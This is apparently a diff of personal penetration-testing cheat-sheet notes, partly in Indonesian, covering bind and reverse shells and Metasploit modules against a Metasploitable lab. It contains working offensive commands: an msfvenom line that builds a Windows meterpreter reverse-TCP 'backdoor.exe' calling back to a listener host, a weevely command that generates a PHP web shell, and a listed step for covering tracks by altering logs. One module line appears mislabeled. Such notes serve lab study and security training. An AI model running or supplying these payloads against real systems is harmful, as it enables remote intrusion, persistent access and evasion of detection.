@@ -1,11 +1,25 @@
 START : 26 JUNE 2025
+
 Bind Shell :
 [Attacker] ---> connect ---> [Victim listening]
 Reverse Shell :
 [Victim] ---> connect ---> [Attacker listening]
+
 LINUX - Metasploitable :  
 PORT 21  || ftp || use exploit/unix/ftp/vsftpd_234_backdoor
 PORT 23 || telnet || 
 PORT 139 || Samba || use exploit/smb/samba/smb_ms17_010
+
 Windows 11 :
 $ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.123.85 LPORT=9999 -f exe -o backdoor.exe
+
+WEB HACKING 
+ 
+Reconnaissance : Mengumpulkan Informasi
+Scanning : Menganalisa Web Vulnerable 
+Exploitation : Exploitasi Vulnerable Pada Aplikasi Berbasis web
+Covering Track : Modifikasi Log Value 
+
+weevely generate josse josseshell.php
+
+burpsuite : change req / bypass filtered
